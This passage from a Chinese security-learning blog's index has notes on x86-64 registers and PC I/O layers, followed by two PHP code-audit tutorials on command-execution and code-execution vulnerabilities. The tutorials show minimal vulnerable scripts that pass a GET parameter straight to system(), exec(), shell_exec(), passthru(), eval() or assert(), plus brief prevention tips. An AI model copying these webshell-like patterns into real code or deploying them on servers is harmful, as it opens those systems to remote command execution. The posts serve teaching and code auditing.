Windows64位版本中不可用。）</p><p>注意尽管x86-64指的是指令集，但是也可以将其看作是处理器类型。</p><h3 id="64位操作模式"><a href="#64位操作模式" class="headerlink" title="64位操作模式"></a>64位操作模式</h3><p>Intel64架构引入了一个新模式，称为IA-32e。从技术上看，这个模式包含两个子模式：兼容模式（compatibility mode）和64位模式（64-bit mode）。不过它们常常被看做是模式而不是子模式。</p><ol><li><p>兼容模式</p><p>在兼容模式下，现有的16位与32位应用程序通常不用进行重新编译就可以运行。但是，16位Windows（Win16）和DOS应用程序不能运行在64位Microsoft Windows下。</p><p>与早期Windows版本不同，64位Windows没有虚拟DOS机器子系统来利用处理器的功能切换到虚拟8086模式。</p></li><li><p>64位模式</p><p>在64位模式下，处理器执行的是使用64位线性地址空间的应用程序。这是64位Microsoft Windows的原生模式，该模式能使用64位指令操作数。</p></li></ol><h3 id="基本64位执行环境"><a href="#基本64位执行环境" class="headerlink" title="基本64位执行环境"></a>基本64位执行环境</h3><p>64位模式下，虽然处理器现在只能支持48位的地址，但是理论上，地址最大为64位。从寄存器来看，64位模式与32位最主要的区别如下所示：</p><ul><li>16个64位通用寄存器（32位模式只有8个通用寄存器）</li><li>8个80位浮点寄存器</li><li>1个64位状态标志寄存器RFLAGS（只使用低32位）</li><li>1个64位指令指针寄存器RIP</li></ul><p>32位标志寄存器和指令指针寄存器分别称为EFLAGS和EIP。此外，还有一些x86处理器用于多媒体处理的特殊寄存器：</p><ul><li>8个64位MMX寄存器</li><li>16个128位XMM寄存器（32位模式只有8个XMM寄存器）</li></ul><h5 id="通用寄存器-1"><a href="#通用寄存器-1" class="headerlink" title="通用寄存器"></a>通用寄存器</h5><p>64位模式下，操作数的默认大小是32位，并且有8个通用寄存器。但是，给每条指令加上REX（寄存器扩展）前缀后，操作数可以达到64位，可用通用寄存器的数量也增加到16个：32位模式下的寄存器，再加上8个有标号的寄存器，R8到R15。</p><table><thead><tr><th>操作数大小</th><th>可用寄存器</th></tr></thead><tbody><tr><td>8 位</td><td>AL、BL、CL、DL、DIL、SIL、BPL、SPL、R8L、R9L、R10L、R11L、R12L、R13L、R14L、R15L</td></tr><tr><td>16 位</td><td>AX、BX、CX、DX、DI、SI、BP、SP、R8W、R9W、R10W、R11W、R12W、R13W、R14W、R15W</td></tr><tr><td>32 位</td><td>EAX、EBX、ECX、EDX、EDI、ESI、EBP、ESP、R8D、R9D、R10D、R11D、R12D、R13D、R14D、R15D</td></tr><tr><td>64 位</td><td>RAX、RBX、RCX、RDX、RDI、RSI、RBP、RSP、R8、R9、R10、R11、R12、R13、R14、R15</td></tr></tbody></table><p>还需要记住的一些细节：</p><ul><li>64位模式下，单条指令不能同时访问寄存器高字节，如AH、BH、CH和DH，以及新字节寄存器的低字节（如DIL）。</li><li>64位模式下，32位EFLAGS寄存器由64位RFLAGS寄存器取代。这两个寄存器共享低32位，而RFLAGS的高32位是不使用的。</li><li>32位模式和64位模式具有相同的状态标志。</li></ul><h1 id="四、x86计算机组件"><a href="#四、x86计算机组件" class="headerlink" title="四、x86计算机组件"></a>四、x86计算机组件</h1><h3 id="主板"><a href="#主板" class="headerlink" title="主板"></a>主板</h3><p>主板是微型计算机的心脏，它是一个平面电路板，其上集成lCPU、支持处理器（芯片组（chipset））、主存、输入输出接口、电源接口和扩展插槽。</p><p>各种组件通过总线即一组直接蚀刻在主板上的导线，进行互连。目前PC市场上有几十种主板，它们在扩展功能、集成部件和速度方面存在着差异。但是，下述组件一般都会出现在主板上：</p><ul><li>CPU插座。根据其支持的处理器类型，插座具有不同的形状和尺寸。</li><li>存储器插槽（SIMM或DIMM），用于直接插入小型内存条。</li><li>BIOS（基本输入输出系统，basic input- output system）计算机芯片，保存系统软件。</li><li>CMOS RAM，用一个小型纽扣电池为其持续供电。</li><li>大容量插槽设备接口，如硬盘和CD-ROMS。</li><li>外部设备的USB接口。</li><li>键盘和鼠标接口。</li><li>PCI总线接口，用于声卡、显卡、数据采集卡和其他输入输出设备。</li></ul><p>以下是可选组件：</p><ul><li>集成声音处理器。</li><li>并行和串行设备接口。</li><li>集成网卡。</li><li>用于高速显卡的AGP总线接口。</li></ul><p>典型系统中还有一些重要的支持处理器：</p><ul><li>浮点单元（FPU），处理浮点数和扩展整数运算。</li><li>8284/82C84时钟发生器，简称时钟，按照恒定速率振荡。时钟发生器同步CPU和计算机的其他部分。</li><li>8259A可编程中断控制器（PIC，Programmable Interrupt Controller），处理来自硬件设备的外部中断请求，包括键盘、系统时钟和磁盘驱动器，这些设备能中断CPU，并使其立即响应它们的请求。</li><li>8253可编程间隔定时器/计数器（Programmable Interval Timer/Counter），每秒中断系统18.2次，更新系统日期和时钟，并控制扬声器。它还负责不断刷新内存，因为RAM存储芯片保持其内容的时间只有几毫秒。</li><li>8255可编程并行端口（Programmable Parallel Port），使用IEEE并行端口将数据输入和输出计算机。该端口通常用于打印机，但是也可以用于其他输入输出设备。</li></ul><ol><li><h5 id="PCI和PCI-Express总线架构"><a href="#PCI和PCI-Express总线架构" class="headerlink" title="PCI和PCI Express总线架构"></a>PCI和PCI Express总线架构</h5><p>PCI（外部设备互联，Peripheral Component Interconnect）总线为CPU和其他系统设备提供了连接桥，这些设备包括硬盘驱动器、内存、显卡、声卡和网卡。</p><p>最近，PCI Express总线在设备、内存和处理器之间提供了双向串行连接。如同网络一样，它用独立的“通信”传送数据包。该总线得到显卡的广泛支持，能以较高速度传输数据。</p></li><li><h5 id="主板芯片组"><a href="#主板芯片组" class="headerlink" title="主板芯片组"></a>主板芯片组</h5><p>主板芯片组（motherlboard chipset）是一组处理器芯片的集合，这些芯片被设计为在特定类型主板上一起工作。</p><p>各种芯片 具有增强处理能力、多媒体功能或减少功耗等特性。以Intel P965 Express芯片组为例，该芯片组与Intel Core2 Duo或Pentium D处理器一起，用于桌面系统。</p><p>Intel P965具有下述特性：</p><ul><li>Intel高速内存访问（Fast Memory Access）使用了最新内存控制中心（MCH）。它可以800MHz时钟速度来访问双通道DDR2存储器。</li><li>I/O控制中心（Intel ICH8/R/DH）使用Intel矩阵存储技术（MST）来支持 多个串行ATA设备（磁盘驱动器）。</li><li>支持多个USB端口，多个PCI Express插槽，联网和Intel静音系统技术。</li><li>高清晰音频芯片提供了数字声音功能。</li></ul><p>如下图所示，主板厂商以特定芯片为中心来制造产品。例如，Asus公司使用P965芯片组的P5B-E P965主板。</p><p><img src="./x86%E5%A4%84%E7%90%86%E5%99%A8%E6%9E%B6%E6%9E%84/4-1Z42G61434K0.png" alt="Intel P965 Express芯片组框图"></p></li></ol><h5 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h5><p>基于Intel的系统使用的是几种基础类型内存：只读存储器（ROM）、可擦除可编程只读存储器（EPROM）、动态随机访问存储器（DRAM）、静态RAM（SRAM）、图像随机存储器（VRAM），和互补金属氧化物半导体（CMOS）RAM：</p><ul><li>ROM永久烧录在芯片上，并且不能擦除。</li><li>EPROM能用紫外线缓慢擦除，并且重新编程。</li><li>DRAM，即通常的内存，在程序运行时保存程序和数据的部件。该部件价格便宜，但是每毫秒需要进行刷新，以避免丢失其内容。有些系统使用的是ECC（错误检查和纠正）存储器。</li><li>SRAM主要用于价格高、速度快的cache存储器。它不需要刷新，CPU的cache存储器就是由SRAM构成的。</li><li>VRAM保存视频数据。VRAM是双端口的，它允许一个端口持续刷新显示器，同时另一个端口将数据写到显示器。</li><li>CMOS RAM在系统主板上，保存系统设置信息。它由电池供电，因此当计算机电源关闭后，CMOS RAM中的内容仍然能有保留。</li></ul><h1 id="五、计算机I-O输入输出系统"><a href="#五、计算机I-O输入输出系统" class="headerlink" title="五、计算机I/O输入输出系统"></a>五、计算机I/O输入输出系统</h1><h3 id="I-O访问层次"><a href="#I-O访问层次" class="headerlink" title="I/O访问层次"></a>I/O访问层次</h3><p>应用程序通常从键盘和磁盘文件读取输入，而将输出写到显示器和文件中。完成I/O不需要直接访问硬件——相反，可以调用操作系统的函数。</p><p>I/O有不同的访问层次，主要有以下三个：</p><ol><li><h5 id="高级语言系统"><a href="#高级语言系统" class="headerlink" title="高级语言系统"></a>高级语言系统</h5><p> 高级编程语言，如C++或Java，包含了执行输入输出的函数。由于这些函数要在各种不同的计算机系统中工作，并不依赖于任何一个操作系统，因此，这些函数具有可移植性。</p></li><li><h5 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h5><p> 程序员能够从被称为API（应用程序编程接口，Application Programming Interface）的库中调用操作系统函数。操作系统提供高级操作，比如，向文件写入字符串，从键盘读取字符，和分配内存块。</p></li><li><h5 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h5><p> 基本输入输出系统是一组能够直接与硬件设备通信的低级子程序集合。BIOS由计算机制造商安装并定制，以适应机器硬件。操作系统通常与BIOS通信。</p></li></ol><h3 id="设备驱动程序"><a href="#设备驱动程序" class="headerlink" title="设备驱动程序"></a>设备驱动程序</h3><p>设备驱动程序允许操作系统与硬件设备和系统BIOS直接通信。例如，设备驱动程序可能接收来自OS的请求来读取一些数据，而满足该请求的方法是，通过执行设备固件中的代码，用设备特有的方式来读取数据。</p><p>设备驱动程序有两种安装方法：一种是在特定硬件设备连接到系统之前，或者设备已连接并且识别之后。对于后一种方法，OS识别设备名称和签名，然后在计算机上定位并安装设备驱动软件。</p><p>现在，通过展示应用程序在屏幕上显示字符串的过程，来了解I/O层次结构如下图所示。</p><p><img src="./x86%E5%A4%84%E7%90%86%E5%99%A8%E6%9E%B6%E6%9E%84/4-1Z42P94340641.png" alt="输入输出操作的访问层次"></p><p>该过程包含一下步骤：</p><ul><li>  应用程序调用HLL库函数，将字符串写入标准输出。</li><li>  库函数（第3层）调用操作系统函数，传递一个字符串指针。</li><li>  操作系统函数（第2层）用循环的方法调用BIOS子程序，向其传递每个字符的ASCII码和颜色。操作系统调用另一个BIOS子程序，将光标移动到屏幕的下一个位置上。</li><li>  BIOS子程序（第1层）接收一个字符，将其映射到一个特定的系统字体，并把该字符发送到与视频控制卡相连的硬件端口。</li><li>  视频控制卡（第0层）为视频显示产生定时映射信号，来控制光栅扫描并显示像素。</li></ul><h3 id="多层次编程"><a href="#多层次编程" class="headerlink" title="多层次编程"></a>多层次编程</h3><p>汇编语言程序在输入输出编程领域有着强大的能力和灵活性。它们可以从以下访问层次进行选择（如下图所示）：</p><ul><li><p>  第3层：调用库函数来执行通用文本I/O和基于文件的I/O。</p></li><li><p>  第2层：调用操作系统函数来执行通用文本I/O和基于文件的I/O。如果OS使用了图形用户界面，它就能用与设备无关的方式来显示图形。</p></li><li><p>  第1层：调用BIOS函数来控制设备具体特性，如颜色、图形、声音、键盘输入和底层磁盘I/O。</p></li><li><p>第0层：从硬件端口发送和接收数据，对特定设备拥有绝对控制权。这个方式没有广泛用于各种硬件设备，因此不具可移植性。不同设备通常使用不同硬件端口，因此，程序代码必须根据每个设备的特定类型来进行定制。</p><p>  <img src="./x86%E5%A4%84%E7%90%86%E5%99%A8%E6%9E%B6%E6%9E%84/4-1Z42P9491MV.png" alt="汇编语言访问层次"></p></li></ul><p>如何进行权衡？控制与可移植性是最重要的。第2层（OS)工作在任何一个运行同样操作系统的计算机上。如果I/O设备缺少某些功能，那么OS将尽可能接近预期结果。第2层速度并不特别快，因为每个I/O调用在执行前，都必须经过好几个层次。</p><p>第1层（BIOS）在具有标准BIOS的所有系统上工作，但是在这些系统上不会产生同样的结果。例如，两台计算机可能会有不同分辨率的视频显示功能。在第1层上的程序员需要编写代码来检测用户的硬件设置，并调整输出格式来与之匹配。第0层的程序执行速度与硬件一样快。</p><p>举个例子，假设要用音频控制设备来播放一个WAV文件。在OS层上，不需要了解已安装设备的类型，也不用关心设备卡的非标准特性。</p><p>在BIOS上，要查询声卡（通过其已安装的设备驱动软件），找出它是否属于某一类具有已知功能的声卡。在硬件层上，需要对特定模式声卡的程序进行微调，以利用每个声卡的特性。</p><p>通用操作系统极少允许应用程序直接访问系统硬件，因为这样做会使得它几乎无法同时运行多个程序。相反，硬件只能由设备驱动程序按照严格控制的方式进行访问。</p><p>另一方面，专业设备额度小型操作系统则常常直接与硬件相连。这样做是为了减少操作系统占用的内存空间，并且这些操作系统几乎总是一次只运行单个程序。Microsoft最后一个允许程序直接访问硬件的操作系统是MS-DOS，它一次只能运行一个程序。</p><p>求学之路：<a href="http://c.biancheng.net/asm/20/">http://c.biancheng.net/asm/20/</a></p>]]></content>
    
    
    <categories>
      
      <category>二进制基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>binary</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP代码审计之命令执行漏洞</title>
    <link href="/2021/05/09/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/05/09/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>  接上次<a href="https://shuishangyun.github.io/2019/05/27/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">代码执行漏洞</a>之后，还有一个跟它相似的命令执行漏洞。这两者的区别就是代码执行漏洞完全限制与语言本身，也就是php代码执行漏洞就要遵循PHP语言规则才能执行；而命令执行漏洞只受限制于网站所在系统，也就是Linux网站遵循Linux系统命令，Windows网站遵循windows系统命令。</p><p>参考文献：<a href="https://www.bilibili.com/video/av48675526/?p=9">水清云影的教学视频</a></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p>  关于命令执行漏洞的概念：命令执行漏洞是程序将不安全的用户数据（表单，cookie，http头等）传递给系统shell时，就有可能存在命令注入。该漏洞的存在原理和代码执行漏洞有点类似，只是使用的函数有所不同。</p><p>  关于命令执行漏洞的利用条件：一是存在可执行系统命令的高危函数，二是用户可以直接或间接控制该函数的参数，三是对该参数的过滤不够严谨。</p><p>  关于命令执行漏洞的类型：</p><ol><li>代码层过滤不严造成的命令执行漏洞；</li><li>系统本身存在的命令执行漏洞；</li><li>调用的第三方组件存在命令执行漏洞。</li></ol><h3 id="PHP中可能造成命令执行漏洞的函数："><a href="#PHP中可能造成命令执行漏洞的函数：" class="headerlink" title="PHP中可能造成命令执行漏洞的函数："></a>PHP中可能造成命令执行漏洞的函数：</h3><ol><li><code>system()函数</code>：原型<code>string system( string $command [,int &amp;$return_var ])</code>，本函数执行 <code>command</code> 参数所指定的命令， 并且输出执行结果。如果 PHP 运行在服务器模块中， <strong>system()</strong> 函数还会尝试在每行输出完毕之后， 自动刷新 web 服务器的输出缓存。</li><li><code>passthru()函数</code>：原型<code>void passthru(string $command [,int &amp;$return_var])</code>，<strong>passthru()</strong> 函数 也是用来执行外部命令（<code>command</code>）的。常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 <em>image/gif</em>， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。</li><li><code>exec()函数</code>：原型<code>string exec(string $command[,array &amp;$output[,int &amp;$return_var]])</code>，执行 <code>command</code> 参数所指定的系统命令。</li><li><code>shell_exec()函数</code>：原型<code>string exec( $command, [$output, [return_var]])</code>，PHP中的一个内置函数，用于通过shell执行命令并以字符串的形式返回完整的输出。shell_exec是backtick操作符的别名，用于*nix。如果命令失败，则返回NULL，并且这些值对于错误检查不可靠。</li></ol><h3 id="命令执行函数使用实例："><a href="#命令执行函数使用实例：" class="headerlink" title="命令执行函数使用实例："></a>命令执行函数使用实例：</h3><ol><li><p><code>system()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">system.php<br>&lt;?php<br>$shell&#x3D;$_GET[&#39;shell&#39;];<br>system($shell);<br>?&gt;<br></code></pre></td></tr></table></figure><p>执行效果如下：</p><img src="/2021/05/09/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.jpg" class="" title="PHP代码审计之命令执行漏洞"><p>  这个函数可以直接将命令带入系统之中，并将结果存为字符串返回输出到浏览界面。而且该函数还可以将结果当作一个字符串返回值进行操作。</p></li><li><p><code>passthru()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">passthru.php<br>&lt;?php<br>$shell&#x3D;$_GET[&#39;shell&#39;];<br>passthru($shell);<br>?&gt;<br></code></pre></td></tr></table></figure><p>执行效果如下：</p><img src="/2021/05/09/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.jpg" class="" title="PHP代码审计之命令执行漏洞"><p>  该函数直接将结果打印到浏览器上，没有返回值。</p></li><li><p><code>exec()函数</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">exec.php<br>&lt;?php<br>$shell&#x3D;$_GET[&#39;shell&#39;];<br>echo exec($shell);<br>?&gt;<br></code></pre></td></tr></table></figure><p>执行效果如下：</p><img src="/2021/05/09/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.jpg" class="" title="PHP代码审计之命令执行漏洞"><p>  该函数执行命令后并不会将结果返回到浏览器上，而且之后保存其中最后一行的结果，这里为方便演示，使用了一个输出关键字，但这并不代表结果是exec函数输出的，只能说明exec在执行完命令后会保存最后一行结果。</p></li><li><p><code>shell_exec()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">shell_exec.php<br>&lt;?php<br>$shell&#x3D;$_GET[&#39;shell&#39;];<br>echo shell_exec($shell);<br>?&gt;<br></code></pre></td></tr></table></figure><p>执行效果如下：</p><img src="/2021/05/09/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.jpg" class="" title="PHP代码审计之命令执行漏洞"><p>  该函数与exec函数相似，同样不会直接输出结果到浏览器，但会将命令执行后的所有结果保存下来。与之相似的还有一个反引号，功能与shell_exec()函数完全一样。</p><img src="/2021/05/09/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/5.jpg" class="" title="PHP代码审计之命令执行漏洞"></li></ol><h5 id="命令执行漏洞的防范："><a href="#命令执行漏洞的防范：" class="headerlink" title="命令执行漏洞的防范："></a>命令执行漏洞的防范：</h5><ol><li>代码层方面对用户的传参进行严格的过滤，如果能将参数写死，尽量不要用可控变量代替；</li><li>系统方面注意定期为系统打补丁；</li><li>有命令执行了漏洞的第三方软件能不要尽量不要使用。</li></ol><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>  本篇文章中主要记录代码层造成的命令注入漏洞，系统层面和第三方组件暂时不做总结，以后找到环境了在总结一波，这些就是我目前掌握的命令执行漏洞，如果有有不正确和不完整的地方，还请大佬们多多批评：</p><img src="/2021/05/09/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/QQ.png" class="" title="PHP代码审计之命令执行漏洞">]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cmd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP代码审计之代码执行漏洞</title>
    <link href="/2021/05/09/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/05/09/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>  这几天过的是相当的充分，不过终于是腾出时间来记录学习笔记了，继上次的特殊注入之后，这次准备记录一下PHP代码中几个高危函数使用不当引起的漏洞。</p><p>参考文献：<a href="https://www.bilibili.com/video/av48675526/?p=8">水清云影的教学</a></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p>  关于代码执行漏洞的解释：代码执行漏洞是指对高危函数传参时过滤不当，字符串被当作代码执行引起的代码注入漏洞。</p><p>  关于代码执行漏洞的利用条件：一般来说要满足三个基础条件，一是存在可以将字符串转换成代码执行的高危函数，二是用户可以直接或间接控制该字符串，三是对该字符串的过滤不当。</p><h3 id="常见PHP高危函数："><a href="#常见PHP高危函数：" class="headerlink" title="常见PHP高危函数："></a>常见PHP高危函数：</h3><ol><li><p>代码执行函数：<code>eval()和assert()</code></p><p>1）<code>bool eval(mixed phpcode)</code>：把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p><p>2）<code>bool assert ( mixed $assertion [Throwable $exception] )</code>如果 <code>assertion</code> ：如果 <code>assertion</code> 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。</p></li><li><p>回调函数：<code>call_user_func()、call_user_func_array()和array_map()</code></p><p>1）<code>mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )</code>：把第一个参数作为回调函数调用。</p><p>2）<code>mixed call_user_func_array ( callable $callback , array $param_arr )</code>：把第一个参数作为回调函数（<code>callback</code>）调用，把参数数组作（<code>param_arr</code>）为回调函数的的参数传入。</p><p>3）<code>array array_map ( callable $callback , array $array1 [, array $... ] )</code>：返回数组，是为 <code>array1</code> 每个元素应用 <code>callback</code>函数之后的数组。 <code>callback</code> 函数形参的数量和传给 <strong>array_map()</strong> 数组数量，两者必须一样。</p></li><li><p>动态执行函数：函数名和参数都由动态变量实现</p><p>1）定义一个函数；</p><p>2）将函数名（字符串）赋值给一个变量；</p><p>3）使用变量名代替函数名调用函数。</p></li></ol><h3 id="高危函数使用实例："><a href="#高危函数使用实例：" class="headerlink" title="高危函数使用实例："></a>高危函数使用实例：</h3><h5 id="eval-和assert"><a href="#eval-和assert" class="headerlink" title="eval()和assert()"></a><code>eval()和assert()</code></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">eval-assert.php<br>&lt;?php<br>$shell&#x3D;$_GET[&#39;shell&#39;];<br>eval($shell);<br>?&gt;<br><br>&lt;?php<br>$shell&#x3D;$_GET[&#39;shell&#39;];<br>assert($shell);<br>?&gt;<br></code></pre></td></tr></table></figure><p>两个函数使用效果类似，如下图：</p><img src="/2021/05/09/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.jpg" class="" title="PHP代码审计之代码执行漏洞"><p>  <code>eval()和assert()</code>两个函数在执行php语句的效果方面是相同的，但eval()函数的参数必须以分号结尾，assert()可以不用，毕竟这个函数原意是用来断言的。</p><h5 id="call-user-func-、call-user-func-array-和array-map"><a href="#call-user-func-、call-user-func-array-和array-map" class="headerlink" title="call_user_func()、call_user_func_array()和array_map()"></a><code>call_user_func()、call_user_func_array()和array_map()</code></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php">callback.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">callback</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$shell</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>);<br>&#125;<br>@call_user_func(<span class="hljs-string">&#x27;callback&#x27;</span>,<span class="hljs-variable">$shell</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">callback</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$shell</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>);<br>&#125;<br>@call_user_func_array(<span class="hljs-string">&#x27;callback&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-variable">$shell</span>));<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">callback</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$shell</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>);<br>&#125;<br>@array_map(<span class="hljs-string">&#x27;callback&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-variable">$shell</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>三个代码的运行的效果类似，如下图：</p><img src="/2021/05/09/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.jpg" class="" title="PHP代码审计之代码执行漏洞"><p>  这三个函数都是将第一个参数当作一个方法名，第二个参数当作该方法的内部参数。不同的是第一个函数接受的回调内部参数是单个变量，而后两个函数接受的回调内部参数必须是数组类型。</p><h5 id="动态执行函数"><a href="#动态执行函数" class="headerlink" title="动态执行函数"></a>动态执行函数</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">run.php<br>&lt;?php<br>$_GET[&#39;func&#39;]($_GET[&#39;shell&#39;]);<br>?&gt;<br><br>&lt;?php<br>$func&#x3D;$_GET[&#39;func&#39;];<br>$shell&#x3D;$_GET[&#39;shell&#39;];<br>$func($shell);<br>?&gt;<br></code></pre></td></tr></table></figure><p>两段代码执行效果类似，如下图：</p><img src="/2021/05/09/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.jpg" class="" title="PHP代码审计之代码执行漏洞"><p>  关键就是能控制函数名和参数，当函数名是个可控变量的时候，该部分的输出就能被改成php中各类高危函数，造成代码执行漏洞。</p><h4 id="代码执行漏洞的防范："><a href="#代码执行漏洞的防范：" class="headerlink" title="代码执行漏洞的防范："></a>代码执行漏洞的防范：</h4><p>  不管是哪种代码执行漏洞，必定会牵扯到参数被利用的地方，只要对用户的传参进行各方面的过滤，或者直接将代码写死，就能有效预防代码执行漏洞的出现。</p><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>  对作为一个小白的我来说，对代码执行漏洞的理解不是太过于深入，以上就是目前的我所理解的代码执行漏洞，如果有什么不完整或不正确的地方，希望大佬们能多多批评：</p><img 